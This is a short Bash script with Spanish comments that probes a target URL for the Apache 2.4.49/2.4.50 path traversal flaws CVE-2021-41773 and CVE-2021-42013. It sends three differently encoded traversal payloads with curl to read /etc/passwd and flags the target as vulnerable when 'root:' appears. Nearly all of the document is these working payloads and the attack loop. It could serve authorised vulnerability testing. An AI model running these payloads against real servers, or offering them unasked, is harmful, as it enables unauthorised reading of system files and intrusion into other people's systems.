#!/bin/bash
# apache_path_traversal.sh
# Apache 2.4.49/2.4.50 específicamente, pero 2.4.41 podría tener configuraciones vulnerable

TARGET="$1"

# Prueba de path traversal
echo "[+] Probando CVE-2021-41773/42013"

paths="/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd
/cgi-bin/.%252e/.%252e/.%252e/.%252e/etc/passwd"

echo "$paths" | while read path; do
    if [ -n "$path" ]; then
        echo "Probando: $path"
        curl -s -v -k "$TARGET$path" | grep -i "root:" && \
        echo "¡VULNERABLE! $path" && return
    fi
done

